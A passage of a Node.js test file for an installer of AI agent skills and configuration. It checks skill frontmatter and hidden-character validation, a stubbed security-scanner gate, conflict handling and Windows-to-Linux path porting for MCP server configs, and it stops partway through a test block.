// Self-check for install-user.mjs: node install-user.test.mjs
// Hermetic: the data repo (with user/ snapshot) and a copy of the tool script live in a temp dir.
// Offline by design: every invocation uses --skip-plugins.
// The examples/data install workflow also skips plugins; neither proves Bun installation.
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { chmodSync, copyFileSync, existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, readlinkSync, realpathSync, readdirSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir, homedir, availableParallelism } from 'node:os';
import { delimiter, dirname, join, sep } from 'node:path';
import { fileURLToPath } from 'node:url';
import { CAPTURE_ROOTS, fingerprint, forAll, forTarget, keepTemp, nextLayerCounter, remapHomePaths, sameContent, skillProblems, splitDeploymentBlocks, withoutDeploymentBlocks } from './lib/data.mjs';
import { BREAK_UI_BASELINE, BREAK_UI_SKILL_MD } from './install-user.fixtures.mjs';

const tmp = mkdtempSync(join(tmpdir(), 'alate-install-'));
const scriptDir = join(tmp, 'tool'); // copy of the script + lib, so the default ../agent-data fallback misses
const data = join(tmp, 'data');
const home = join(tmp, 'home');
// The child's HOME is a scratch dir distinct from the --home target: a dropped --home (a
// Stryker mutant) installs into the sandbox and fails the assertions, never the machine
// home. ALATE_DATA points at a missing path, so a host that exports one cannot turn the
// missing-data refusals into surprise installs.
const childHome = join(tmp, 'child-home');
mkdirSync(childHome);
const sandbox = (env = process.env) => {
  // A caller HOME that differs from this process's own home is an explicit fixture
  // decision (the scanner tests couple the venv location to it); every other child, and
  // every child that would inherit this process's real home, gets the scratch home.
  const home = env?.HOME && env.HOME !== process.env.HOME ? env.HOME : childHome;
  const child = { ...env, HOME: home, USERPROFILE: home, ALATE_DATA: join(tmp, 'no-aldata') };
  delete child.PI_CODING_AGENT_DIR; // the nested sync.mjs spawn must not see a real agent dir
  return child;
};
mkdirSync(join(scriptDir, 'lib'), { recursive: true });
copyFileSync(fileURLToPath(new URL('./install-user.mjs', import.meta.url)), join(scriptDir, 'install-user.mjs'));
copyFileSync(fileURLToPath(new URL('./lib/data.mjs', import.meta.url)), join(scriptDir, 'lib', 'data.mjs'));
// Layer mode spawns the real sync.mjs beside the script for the rules install.
copyFileSync(fileURLToPath(new URL('./sync.mjs', import.meta.url)), join(scriptDir, 'sync.mjs'));
// The shipped-skill install reads the pin module and the vendored tree from the tool root,
// so the sandbox provisions the real vendored skills like a real checkout does.
copyFileSync(fileURLToPath(new URL('./lib/shipped.mjs', import.meta.url)), join(scriptDir, 'lib', 'shipped.mjs'));
const shippedSkillsRoot = join(scriptDir, 'shipped', 'ottr', '.agents', 'skills');
const copyTree = (src, dst) => {
  mkdirSync(dst, { recursive: true });
  for (const entry of readdirSync(src, { withFileTypes: true })) {
    const from = join(src, entry.name);
    const to = join(dst, entry.name);
    if (entry.isDirectory()) copyTree(from, to);
    else copyFileSync(from, to);
  }
};
copyTree(fileURLToPath(new URL('./shipped/ottr', import.meta.url)), join(scriptDir, 'shipped', 'ottr'));
// The vendored whole tree is the source, not a fixed list: count its folders at setup, so
// a test that adds a folder keeps every shippedCount-derived expectation true.
const shippedCount = readdirSync(shippedSkillsRoot, { withFileTypes: true }).filter(e => e.isDirectory()).length;
const put = (rel, text) => { mkdirSync(join(data, 'user', rel, '..'), { recursive: true }); writeFileSync(join(data, 'user', rel), text); };
const skillText = (name, body = `# ${name}\n`) => `---\nname: ${name}\ndescription: Test skill.\n---\n${body}`;
const run = (extra, h = home, env, cwd) => {
  // Neutralize an inherited SKILLSPECTOR_BIN (the container image sets it) unless this call
  // provides one: the tests below manage scanner resolution explicitly.
  const resolved = scanned || env ? (env ?? { ...process.env, PATH: `${stubDir}${delimiter}${process.env.PATH ?? ''}`, SKILLSPECTOR_VENV: join(tmp, 'no-venv') }) : undefined;
  if (resolved && !('SKILLSPECTOR_BIN' in resolved)) resolved.SKILLSPECTOR_BIN = '';
  return spawnSync(process.execPath, [join(scriptDir, 'install-user.mjs'), '--home', h, ...extra], {
    encoding: 'utf8',
    cwd,
    // Default env puts the stub skillspector first on PATH (the scan gate) and points
    // SKILLSPECTOR_VENV at a path that does not exist, so the run resolves the PATH stub; an
    // explicit env runs without either. Windows cannot exec an extensionless stub through
    // spawnSync, so there the suite needs a real skillspector: the gate fails closed without
    // one, by design.
    env: sandbox(resolved),
  });
};
// The stub logs its scan argv and exits with a script-set code: 0 clean, 1 findings. A
// --version probe is answered but not logged: install-user probes the version once per run
// before it scans, and the log stays a scan-only record.
const stubDir = join(tmp, 'stub');
const callsLog = join(stubDir, 'calls.log');
const scanned = process.platform !== 'win32';
const writeStub = (exit, version = 'SkillSpector v2.13.0', rejectNames = [], errorNames = []) => {
  // rejectNames holds skill-dir basenames the stub rejects: it prints a findings-shaped
  // report (a HIGH SC2 finding plus its Location line, the pinned scanner's real format)
  // and exits 1 for those dirs only, so one named skill can fail while the others pass.
  // errorNames holds basenames whose scan crashes: the stub prints a diagnostic on stderr
  // and exits 2, the stand-in for a real scan error such as an unparseable baseline file.
  writeFileSync(join(stubDir, 'reject.list'), rejectNames.length ? `${rejectNames.join('\n')}\n` : '');
  writeFileSync(join(stubDir, 'error.list'), errorNames.length ? `${errorNames.join('\n')}\n` : '');
  writeFileSync(join(stubDir, 'skillspector'), `#!/bin/sh\n[ "$1" = scan ] && printf '%s\\n' "$*" >> '${callsLog}'\nif [ "$1" = "--version" ]; then echo '${version}'; exit 0; fi\nif [ "$1" = scan ] && grep -qx "$(basename "$2")" '${stubDir}/error.list' 2>/dev/null; then\n  echo 'skillspector: unparseable .skillspector-baseline.yaml (yaml: line 1: did not find expected key)' >&2\n  exit 2\nfi\nif [ "$1" = scan ] && grep -qx "$(basename "$2")" '${stubDir}/reject.list' 2>/dev/null; then\n  printf '  HIGH: SC2 - External Script Fetching...\\n    Location: SKILL.md:7\\n'\n  exit 1\nfi\nexit ${exit}\n`);
  chmodSync(join(stubDir, 'skillspector'), 0o755);
};
if (scanned) {
  mkdirSync(stubDir, { recursive: true });
  writeStub(0);
}
// Mirrors install-user's trust-first resolution: SKILLSPECTOR_BIN when set, then the pinned
// venv (only when it is not under the default ~/.cache, which a worker turn can write), then
// PATH. Returns the first candidate reporting the pin, or null.
const discoverRealScanner = () => {
  const venv = process.env.SKILLSPECTOR_VENV ?? join(homedir(), '.cache', 'skillspector-venv');
  const answersPin = candidate => {
    const probe = spawnSync(candidate, ['--version'], { encoding: 'utf8' });
    return probe.status === 0 && String(probe.stdout).trim() === 'SkillSpector v2.13.0';
  };
  const candidates = [];
  if (process.env.SKILLSPECTOR_BIN) candidates.push(process.env.SKILLSPECTOR_BIN);
  if (!venv.startsWith(join(homedir(), '.cache') + sep)) candidates.push(join(venv, process.platform === 'win32' ? join('Scripts', 'skillspector.exe') : join('bin', 'skillspector')));
  candidates.push(...(process.env.PATH ?? '').split(delimiter).map(dir => join(dir, process.platform === 'win32' ? 'skillspector.exe' : 'skillspector')));
  for (const candidate of candidates) if (answersPin(candidate)) return candidate;
  return null;
};
const got = rel => readFileSync(join(home, rel), 'utf8');

try {
  // Missing data dir: no --data, fallback ../agent-data beside scriptDir does not exist.
  let r = run(['--skip-plugins']);
  assert.equal(r.status, 1);
  assert.match(r.stderr, /No data dir|--data|--repo/);

  // Missing user/ snapshot in an existing data dir.
  mkdirSync(data, { recursive: true });
  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 1);
  assert.match(r.stderr, /No user\/ snapshot/);
  assert.ok(r.stderr.includes(data), r.stderr);

  // The structure gate checks source bytes before scans, writes, deletions, or layer creation.
  if (scanned) {
    const malformedSkills = [
      ['missing-entrypoint', null],
      ['unreadable-entrypoint', undefined],
      ['no-frontmatter', '# Private body sentinel.\n'],
      ['leading-newline', `\n${skillText('demo')}`],
      ['leading-space', ` ${skillText('demo')}`],
      ['leading-comment', `# Prefix sentinel.\n${skillText('demo')}`],
      ['bom', `\uFEFF${skillText('demo')}`],
      ['opening-suffix', '---suffix\nname: demo\ndescription: Test.\n---\n'],
      ['missing-closing', '---\nname: demo\ndescription: Test.\n'],
      ['closing-suffix', '---\nname: demo\ndescription: Test.\n---suffix\n'],
      ['closing-indented', '---\nname: demo\ndescription: Test.\n ---\n'],
      ['missing-name', '---\ndescription: Test.\n---\nname: body-only\n'],
      ['blank-name', '---\nname: \ndescription: Test.\n---\n'],
      ['empty-quoted-name', '---\nname: ""\ndescription: Test.\n---\n'],
      ['comment-name', '---\nname: # Comment sentinel.\ndescription: Test.\n---\n'],
      ['escaped-invalid-name', '---\nname: "bad\\u0020name"\ndescription: Test.\n---\n'],
      ['escaped-empty-description', '---\nname: demo\ndescription: "\\n"\n---\n'],
      ...['Bad', 'bad_name', 'bad.name', '-bad', 'bad/name', 'bad name', 'café'].map((name, i) => [`invalid-name-${i}`, skillText(name)]),
      ['missing-description', '---\nname: demo\n---\ndescription: body-only\n'],
      ...['', '   ', "''", '""', '"  "', '# Comment sentinel.', '|', '>', '|-\n  ', '>+\n  ']
        .map((value, i) => [`empty-description-${i}`, `---\nname: demo\ndescription: ${value}\n---\nBody\n`]),
      ['indented-comment-description', '---\nname: demo\ndescription:\n  # Comment sentinel.\n---\n'],
      ['indented-empty-description', '---\nname: demo\ndescription:\n  ""\n---\n'],
      ['hidden-body', skillText('demo', 'Private\u200Bbody sentinel.\n')],
      ['hidden-description', '---\nname: demo\ndescription: Private\u202Edescription sentinel.\n---\n'],
    ];
    const malformedRel = name => `${['omp/agent/skills', 'omp/agent/managed-skills', 'agents/skills'][malformedSkills.findIndex(([entry]) => entry === name) % 3]}/${name}`;
    const validSkills = [
      ['omp/agent/skills/demo', skillText('demo')],
      ['omp/agent/managed-skills/managed', "---\nname: 'managed'\ndescription: \"Quoted description.\"\nlicense: MIT\n---\nBody\n"],
      ['agents/skills/agents', '---\r\nname: agents\r\ndescription: Test CRLF.\r\n---\r\nBody\r\n'],
      ['omp/agent/skills/literal', '---\nname: literal\ndescription: |-\n  First line.\n  Second line.\n---\nBody\n'],
      ['omp/agent/skills/folded', '---\nname: folded\ndescription: >+\n  First line.\n  Second line.\n---\nBody\n'],
      ['omp/agent/skills/indented', '---\nname: indented\ndescription:\n  Indented description.\n---\nBody\n'],
      ['omp/agent/skills/multiline', '---\nname: multiline\ndescription:\n  "First line.\n  Second line."\n---\nBody\n'],
      ['omp/agent/skills/comment-text', '---\nname: comment-text\ndescription: |\n  # Literal text, not a YAML comment.\n---\nBody\n'],
      ['omp/agent/skills/emoji', skillText('emoji', 'Normal emoji: 👩‍💻 and ☀️.\n')],
    ];
    const snapshot = root => {
      if (!existsSync(root)) return null;
      const entries = [];
      const visit = path => {
        const stat = lstatSync(path);
        entries.push([path, stat.mode, stat.mtimeMs, stat.isSymbolicLink() ? readlinkSync(path) : stat.isDirectory() ? null : readFileSync(path).toString('hex')]);
        if (stat.isDirectory()) for (const entry of readdirSync(path).sort()) visit(join(path, entry));
      };
      visit(root);
      return entries;
    };
    for (const layer of [false, true]) {
      const gateData = join(tmp, layer ? 'structure-layer-data' : 'structure-data');
      const gatePut = (rel, text) => {
        const path = join(gateData, 'user', rel);
        mkdirSync(dirname(path), { recursive: true });
        writeFileSync(path, text);
      };
      gatePut('omp/agent/config.yml', 'modelRoles:\n  default: zai/glm\n');
      gatePut('omp/agent/AUX.md', 'A recorded file must survive refusal.\n');
      for (const [rel, text] of validSkills) gatePut(`${rel}/SKILL.md`, text);
      const target = join(tmp, layer ? 'structure-layer-home' : 'structure-home');
      const extra = ['--data', gateData, '--skip-plugins', ...(layer ? ['--layer'] : [])];
      let result = run(extra, target);
      assert.equal(result.status, 0, `valid skill metadata installs: ${result.stderr}`);
      result = run(extra, target);
      assert.equal(result.status, 0, result.stderr);
      assert.match(result.stdout, new RegExp(`0 of ${validSkills.length + shippedCount} skill snapshot\\(s\\) \\(${validSkills.length + shippedCount} cached\\)`), 'the fixture starts with a warm scanner cache');
      for (const [name, text] of malformedSkills) {
        const rel = malformedRel(name);
        if (text === undefined) mkdirSync(join(gateData, 'user', rel, 'SKILL.md'), { recursive: true });
        else if (text === null) gatePut(`${rel}/README.md`, 'Missing entrypoint.\n');
        else gatePut(`${rel}/SKILL.md`, text);
      }
      // A genuine cache-key envelope with a malformed file hash proves that cached passes
      // cannot replace structural validation. This folder contains one file only.
      const cachePath = join(target, '.alate/skillspector-pass.json');
      const passes = JSON.parse(readFileSync(cachePath, 'utf8'));
      const bytes = Buffer.from(malformedSkills.find(([name]) => name === 'no-frontmatter')[1]);
      const digest = createHash('sha256').update(`f\0SKILL.md\0${bytes.length}\0${createHash('sha256').update(bytes).digest('hex')}\0`).digest('hex');
      const cachedKey = Object.keys(passes)[0].replace(/^(skill-pass-fmt-\d+) \S+ /, `$1 ${digest} `);
      passes[cachedKey] = true;
      writeFileSync(cachePath, `${JSON.stringify(passes, null, 2)}\n`);
      gatePut('omp/agent/config.yml', 'modelRoles:\n  default: changed/model\n');
      rmSync(join(gateData, 'user/omp/agent/AUX.md'));
      const callsBefore = readFileSync(callsLog, 'utf8');
      result = run([...extra, '--force'], target);
      assert.equal(result.status, 1, `invalid skills fail the run but the good ones install (${layer ? 'layer' : 'normal'})`);
      assert.ok(result.stdout.includes('Failed items:'), 'the failed items print as one stdout block');
      for (const [name] of malformedSkills) {
        assert.ok(result.stdout.includes(`user/${malformedRel(name)}`), `the run reports ${name}: ${result.stdout}`);
        assert.ok(result.stdout.includes('rejected:'), `the report carries the rule and position for ${name}: ${result.stdout}`);
      }
      for (const value of ['Private body sentinel.', 'Prefix sentinel.', 'Comment sentinel.', 'bad_name', 'café']) {
        assert.ok(!result.stdout.includes(value) && !result.stderr.includes(value), 'diagnostics do not print field or body text');
      }
      assert.match(result.stdout, /\d+ installed/, 'the surviving items still install');
      // Layer mode writes into the new layer; in-place mode into the home itself.
      const runRoot = layer ? realpathSync(join(target, '.alate', 'current')) : target;
      assert.ok(readFileSync(join(runRoot, '.omp/agent/config.yml'), 'utf8').includes('changed/model'), 'the good snapshot change lands');
      assert.ok(!existsSync(join(runRoot, '.omp/agent/skills/missing-entrypoint')), 'an excluded skill never lands');
      // In layer mode the record rides in the layer it describes.
      const recordPath = join(runRoot, '.alate', 'installed.json');
      const record = JSON.parse(readFileSync(recordPath, 'utf8'));
      for (const [name] of malformedSkills) {
        assert.ok(!Object.keys(record).some(rel => rel.startsWith(malformedRel(name))), `the manifest omits excluded skills (${name})`);
      }
      assert.equal(readFileSync(callsLog, 'utf8'), callsBefore, 'excluded skills are never scanned');
      const fresh = join(tmp, layer ? 'structure-layer-fresh' : 'structure-fresh');
      result = run(extra, fresh);
      assert.equal(result.status, 1, result.stderr);
      const freshRoot = layer ? realpathSync(join(fresh, '.alate', 'current')) : fresh;
      assert.ok(existsSync(join(freshRoot, '.omp/agent/skills/demo/SKILL.md')), 'the good skills install into a fresh home too');
      assert.ok(!existsSync(join(freshRoot, '.omp/agent/skills/no-frontmatter')), 'the excluded skill stays out of a fresh home');
      const freshCalls = readFileSync(callsLog, 'utf8').slice(callsBefore.length);
      for (const [name] of malformedSkills) {
        assert.ok(!freshCalls.includes(malformedRel(name)), `a fresh-home run never scans the excluded skill (${name})`);
      }
    }
  }

  for (const name of ['a', '0', 'a--', '0-9', 'a'.repeat(300)]) {
    assert.deepEqual(skillProblems('names/SKILL.md', skillText(name)), [], 'the name pattern adds no length or hyphen restriction');
  }
  for (const value of ['bad\\u0020name', 'bad\\tname', '\\u0042ad', 'bad\\u005fname']) {
    const problems = skillProblems('escaped-name/SKILL.md', `---\nname: "${value}"\ndescription: Test.\n---\n`);
    assert.ok(problems.length > 0, 'decoded invalid name characters refuse the skill');
    assert.ok(problems.every(problem => problem.includes('escaped-name/SKILL.md')), 'escaped name problems name the source path');
  }
  for (const value of ['\\n', '\\t', '\\r', '\\u0020', '\\n\\t\\r\\u0020']) {
    assert.ok(skillProblems('escaped-description/SKILL.md', `---\nname: demo\ndescription: "${value}"\n---\n`).length > 0, 'decoded blank descriptions refuse the skill');
  }
  for (const value of ['\\q', '\\x20', '\\xGG', '\\u12', '\\U00000065', '\\U00110000']) {
    assert.ok(skillProblems('invalid-escape/SKILL.md', `---\nname: "${value}"\ndescription: Test.\n---\n`).length > 0, 'invalid name escapes refuse the skill');
    assert.ok(skillProblems('invalid-escape/SKILL.md', `---\nname: demo\ndescription: "${value}"\n---\n`).length > 0, 'invalid description escapes refuse the skill');
  }
  for (const [name, description] of [
    ['"d\\u0065mo"', '"A\\nvalid description."'],
    ['"demo\\u002dname"', '"A \\"quoted\\" description."'],
    ['"demo"', '"A \\\\ backslash."'],
    ["'demo'", "'A ''quoted'' description.'"],
  ]) {
    assert.deepEqual(skillProblems('valid-escape/SKILL.md', `---\nname: ${name}\ndescription: ${description}\n---\n`), [], 'supported escaped metadata passes with decoded values');
  }
  const choose = (rand, values) => values[Math.floor(rand() * values.length)];
  forAll((rand, size) => {
    const first = choose(rand, 'abcdefghijklmnopqrstuvwxyz0123456789');
    return first + Array.from({ length: Math.floor(rand() * size) }, () => choose(rand, 'abcdefghijklmnopqrstuvwxyz0123456789-')).join('');
  }, name => {
    assert.deepEqual(skillProblems('valid/SKILL.md', skillText(name)), []);
    for (const invalid of [`-${name}`, `${name}_x`, `${name}X`, `${name}.x`, `${name}/x`, `${name}é`]) {
      const problems = skillProblems('invalid/SKILL.md', skillText(invalid));
      assert.ok(problems.length > 0, 'invalid name characters refuse the skill');
      assert.ok(problems.every(problem => problem.includes('invalid/SKILL.md')), 'every problem names its path');
    }
  });
  forAll(rand => choose(rand, ['\n', '\r\n', ' ', '\t', '\uFEFF', '# Prefix\n', 'body\n']), prefix => {
    assert.ok(skillProblems('prefix/SKILL.md', prefix + skillText('demo')).length > 0, 'frontmatter must start at byte zero');
  });
  forAll(rand => choose(rand, [0, 1, 8, 11, 12, 14, 31, 127, 133, 159, 0x200b, 0x200d, 0x202e, 0x2066, 0xfe00, 0xfe0f, 0xfeff, 0xe0100]), cp => {
    const problems = skillProblems('hidden/SKILL.md', skillText('demo', `Before${String.fromCodePoint(cp)}after.\n`));
    assert.ok(problems.some(problem => problem.includes('hidden/SKILL.md') && /hidden character/.test(problem)), 'forbidden hidden characters refuse skill bodies');
  });

  put('omp/agent/config.yml', 'modelRoles:\n  default: zai/glm\n');
  put('omp/agent/skills/mine/SKILL.md', skillText('mine'));
  put('omp/plugins/package.json', '{"dependencies":{}}\n');
  put('omp/plugins/bun.lock', '{}\n');
  put('agents/.skill-lock.json', '{"skills":{}}\n');
  put('agents/skills/theirs/SKILL.md', skillText('theirs'));

  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /20 installed, 0 unchanged/);
  assert.equal(got('.omp/agent/config.yml'), 'modelRoles:\n  default: zai/glm\n');
  assert.equal(got('.agents/.skill-lock.json'), '{"skills":{}}\n', 'the first dot is restored');
  assert.ok(existsSync(join(home, '.omp/agent/skills/mine/SKILL.md')), 'nested dirs are created');
  assert.match(r.stdout, /plugins skipped/);

  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /0 installed, 20 unchanged/, 'a rerun copies nothing');

  // A CRLF copy of the same bytes counts as unchanged, so autocrlf checkouts never churn a live home.
  mkdirSync(join(home, '.agents/skills/theirs'), { recursive: true });
  writeFileSync(join(home, '.agents/skills/theirs/SKILL.md'), skillText('theirs').replaceAll('\n', '\r\n'));
  r = run(['--data', data, '--skip-plugins']);
  assert.match(r.stdout, /0 installed, 20 unchanged/);
  assert.equal(got('.agents/skills/theirs/SKILL.md'), skillText('theirs').replaceAll('\n', '\r\n'), 'line-ending-only drift is not rewritten');

  const live = '# mine, edited on the machine\n';
  writeFileSync(join(home, '.omp/agent/skills/mine/SKILL.md'), live);
  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 1, 'a differing live file is refused');
  assert.ok(r.stderr.includes(join(home, '.omp/agent/skills/mine/SKILL.md')), r.stderr);
  assert.equal(got('.omp/agent/skills/mine/SKILL.md'), live, 'refusal leaves the machine file alone');

  r = run(['--data', data, '--force', '--skip-plugins']);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(got('.omp/agent/skills/mine/SKILL.md'), skillText('mine'), '--force restores the snapshot');

  // alate remembers what it installed: a newer snapshot replaces a file nobody changed since...
  const mine = '.omp/agent/skills/mine/SKILL.md';
  put('omp/agent/skills/mine/SKILL.md', skillText('mine', '# mine, v2\n'));
  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 0, `an untouched install takes the newer snapshot: ${r.stderr}`);
  assert.match(r.stdout, /1 installed, 19 unchanged/);
  assert.equal(got(mine), skillText('mine', '# mine, v2\n'));
  // ...but not one changed on the machine since,
  writeFileSync(join(home, mine), live);
  put('omp/agent/skills/mine/SKILL.md', skillText('mine', '# mine, v3\n'));
  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 1, 'a file changed after the install is refused');
  assert.match(r.stderr, /commit the change to the data repo/);
  assert.equal(got(mine), live);
  // ...nor one it cannot vouch for: an unreadable record proves nothing.
  r = run(['--data', data, '--force', '--skip-plugins']);
  writeFileSync(join(home, '.alate/installed.json'), '{');
  put('omp/agent/skills/mine/SKILL.md', skillText('mine', '# mine, v4\n'));
  r = run(['--data', data, '--skip-plugins']);
  assert.equal(r.status, 1, 'an unreadable record never licenses an overwrite');
  assert.match(r.stderr, /Ignoring unreadable/);
  assert.equal(got(mine), skillText('mine', '# mine, v3\n'));
  r = run(['--data', data, '--force', '--skip-plugins']);
  assert.equal(r.status, 0, r.stderr);
  assert.ok(JSON.parse(got('.alate/installed.json'))['omp/agent/skills/mine/SKILL.md'], '--force writes a fresh record');

  // Snapshots come from Windows; workers and CI run Linux. There, paths into the captured layer
  // follow the home (a Windows catalog path became a junk file in each worktree), a cmd /c wrapper
  // goes (npx runs directly), MCP servers that still only run on Windows are disabled and named, not
  // left to fail on every start, and chrome-devtools-mcp gets what Chrome needs in a root container.
  const mcp = {
    mcpServers: {
      devtools: { command: 'cmd', args: ['/c', 'npx', '-y', 'chrome-devtools-mcp@latest', '--isolated'] },
      wrapped: { command: 'cmd', args: ['/c', 'npx', '-y', 'some-mcp'] },
      plugin: { command: 'node', args: ['C:\\Users\\me\\.omp\\plugins\\node_modules\\x\\server.mjs'] },
      native: { command: 'npx', env: { TOOL: 'C:\\Users\\me\\scoop\\shims\\tool.exe', KEEP: 'yes' } },
      exe: { command: 'C:\\tools\\srv.exe' },
      shell: { command: 'cmd.exe', args: ['/d', '/c', 'npx -y spaced-mcp'] },
      web: { type: 'http', url: 'https://example.com/mcp' },
    },
    disabledServers: ['old'],
  };
  const raw = Buffer.from(JSON.stringify(mcp));
  const linux = { home: '/home/u', platform: 'linux', roots: new Set(['.omp', '.agents']) };
  let t = forTarget('omp/agent/mcp.json', raw, linux);
  const doc = JSON.parse(t.bytes);
  assert.deepEqual(doc.mcpServers.plugin.args, ['/home/u/.omp/plugins/node_modules/x/server.mjs']);
  assert.deepEqual(doc.mcpServers.wrapped, { command: 'npx', args: ['-y', 'some-mcp'] }, 'cmd /c goes, the program runs');
  assert.deepEqual(doc.mcpServers.devtools.args, ['-y', 'chrome-devtools-mcp@latest', '--isolated', '--headless', '--chrome-arg=--no-sandbox'],
    'chrome-devtools-mcp runs headless, isolated and without the sandbox; a flag it already has is not repeated');
  assert.deepEqual(doc.mcpServers.native.env, { KEEP: 'yes' }, 'only the Windows path is dropped');
  assert.deepEqual(doc.disabledServers, ['exe', 'old', 'shell']);
  assert.deepEqual(doc.mcpServers.shell, mcp.mcpServers.shell, 'a disabled server keeps its config');
  assert.deepEqual(doc.mcpServers.web, mcp.mcpServers.web);
  assert.equal(t.notes.length, 7, t.notes.join('\n'));
  assert.ok(t.notes.some(n => n.includes('MCP server shell runs through cmd.exe')), t.notes.join('\n'));
  assert.ok(t.notes.some(n => n.includes('MCP server exe runs through C:\\tools\\srv.exe')), t.notes.join('\n'));
  t = forTarget('omp/agent/mcp.json', raw, { ...linux, platform: 'win32' });
  assert.equal(t.bytes, raw, 'a Windows target gets the captured bytes');
  assert.deepEqual(t.notes, []);
  t = forTarget('omp/marketplaces.json', Buffer.from(JSON.stringify({ marketplaces: [{ catalogPath: 'C:\\Users\\me\\.omp\\plugins\\cache\\marketplaces\\m\\marketplace.json' }] })), linux);
  assert.equal(JSON.parse(t.bytes).marketplaces[0].catalogPath, '/home/u/.omp/plugins/cache/marketplaces/m/marketplace.json');
  const elsewhere = Buffer.from(JSON.stringify({ source: 'C:\\Users\\me\\skills\\x\\SKILL.md' }));
  t = forTarget('agents/skills/x/meta.json', elsewhere, linux);
  assert.equal(t.bytes, elsewhere, 'a path outside the layer has no target: installed as captured');
  assert.deepEqual(t.notes, []);

  // Mirror direction: a Linux worker capture holds POSIX absolute paths, and a Windows target
  // roots them at its own home with Windows separators. Only paths through a layer root move.
  const winTarget = { home: 'C:\\Users\\me', platform: 'win32', roots: new Set(['.omp', '.agents']) };
  const captured = Buffer.from(JSON.stringify({ marketplaces: [{ catalogPath: '/root/.omp/plugins/cache/marketplaces/m/marketplace.json' }] }));
  t = forTarget('omp/marketplaces.json', captured, winTarget);
  assert.equal(JSON.parse(t.bytes).marketplaces[0].catalogPath, 'C:\\Users\\me\\.omp\\plugins\\cache\\marketplaces\\m\\marketplace.json');
  assert.deepEqual(t.notes, ['omp/marketplaces.json: 1 POSIX path(s) now point into C:\\Users\\me']);
  const usr = Buffer.from(JSON.stringify({ node: '/usr/bin/node' }));
  t = forTarget('omp/agent/x.json', usr, winTarget);
  assert.equal(t.bytes, usr, 'a POSIX path outside the layer roots stays as captured');
  assert.deepEqual(t.notes, []);
  // The conflict compare rides on the ported form: what install writes differs from the
  // captured bytes, so a compare that skipped the port would turn every rerun into a conflict.
  assert.ok(!sameContent('omp/marketplaces.json', t.bytes, captured), 'the ported bytes differ from the captured ones');
  assert.ok(sameContent('omp/marketplaces.json', t.bytes, t.bytes), 'a machine copy of the ported form is unchanged');

  // Property: a ported path always lands inside the target home, and porting the ported form
  // changes nothing. '..' stays out of the generator: a real capture never carries it, and a
  // join above the home would legitimately leave the home prefix.
  const SEG = ['root', 'home', 'u', 'dom', 'usr', 'bin', 'plugins', 'cache', 'm', 'x', 'skills'];
  const absPath = rand => {
    let p = '';
    for (let i = 0, n = Math.floor(rand() * 3); i < n; i++) p += `/${SEG[Math.floor(rand() * SEG.length)]}`;
    const rootsList = [...winTarget.roots];
    p += rand() < 0.7 ? `/${rootsList[Math.floor(rand() * rootsList.length)]}` : `/${SEG[Math.floor(rand() * SEG.length)]}`;
    for (let i = 0, n = Math.floor(rand() * 3); i < n; i++) p += `/${SEG[Math.floor(rand() * SEG.length)]}`;
    return p;
  };
  forAll(rand => {
    const doc = {};
    for (let i = 0, n = 1 + Math.floor(rand() * 3); i < n; i++) doc[`k${i}`] = rand() < 0.6 ? absPath(rand) : SEG[Math.floor(rand() * SEG.length)];
    return doc;
  }, doc => {
    const first = forTarget('omp/agent/prop.json', Buffer.from(JSON.stringify(doc)), winTarget);
    const out = JSON.parse(first.bytes);
    for (const [k, v] of Object.entries(doc)) {
      if (out[k] === v) continue;
      assert.ok(String(out[k]).startsWith(winTarget.home), `a moved value stays inside the target home: ${v} -> ${out[k]}`);
    }
    const again = forTarget('omp/agent/prop.json', first.bytes, winTarget);
    assert.deepEqual(JSON.parse(again.bytes), out, 'porting the ported form changes nothing');
    assert.deepEqual(again.notes, [], 'the second port moves nothing');
  });
  // Gate pins the run above leaves open: .json scoping, unparsable JSON, nested rebase
  // shapes, exact note wording, and the disabledServers rewrite rule.
  {
    // Only a .json rel is adapted: a YAML rel with parsable JSON bytes installs as captured.
    const jsonish = Buffer.from('{"source": "C:\\\\me\\\\.omp\\\\cfg.json"}');
    let t2 = forTarget('omp/agent/config.yml', jsonish, linux);
    assert.equal(t2.bytes, jsonish, 'a non-JSON rel installs as captured');
    assert.deepEqual(t2.notes, []);

    // Unparsable JSON installs as captured.
    const broken = Buffer.from('{"mcpServers":');
    t2 = forTarget('omp/agent/mcp.json', broken, linux);
    assert.equal(t2.bytes.toString(), broken.toString(), 'unparsable JSON installs as captured');
    assert.deepEqual(t2.notes, []);

    // The rebase walks nested objects and arrays, moves only drive-letter paths that hit a
    // captured layer segment, and leaves every other value type alone.
    const nested = Buffer.from(JSON.stringify({
      a: { b: { p: 'C:\\\\me\\\\.omp\\\\deep.json' }, rel: '.omp/looks/posix', keep: [5, true, null] },
    }));
    t2 = forTarget('agents/x/meta.json', nested, linux);
    assert.deepEqual(JSON.parse(t2.bytes), {
      a: { b: { p: '/home/u/.omp/deep.json' }, rel: '.omp/looks/posix', keep: [5, true, null] },
    });
    assert.deepEqual(t2.notes, ['agents/x/meta.json: 1 Windows path(s) now point into /home/u']);

    // Repeated separators collapse into one split point.
    t2 = forTarget('agents/x/meta.json', Buffer.from(JSON.stringify({ p: 'C:\\\\me\\\\\\\\.omp\\\\a\\\\\\\\b.json' })), linux);
    assert.deepEqual(JSON.parse(t2.bytes).p, '/home/u/.omp/a/b.json');

    // A listed-disabled server is skipped entirely: not unwrapped, not flagged, not noted.
    const quiet = Buffer.from(JSON.stringify({ mcpServers: { legacy: { command: 'cmd', args: ['/c', 'tool.exe'] } }, disabledServers: ['legacy'] }));
    t2 = forTarget('omp/agent/mcp.json', quiet, linux);
    assert.equal(t2.bytes, quiet, 'a disabled server keeps its captured bytes');
    assert.deepEqual(t2.notes, []);

    // A server without an env block scans nothing.
    const bare = Buffer.from(JSON.stringify({ mcpServers: { p: { command: 'npx', args: ['-y', 'm'] } } }));
    t2 = forTarget('omp/agent/mcp.json', bare, linux);
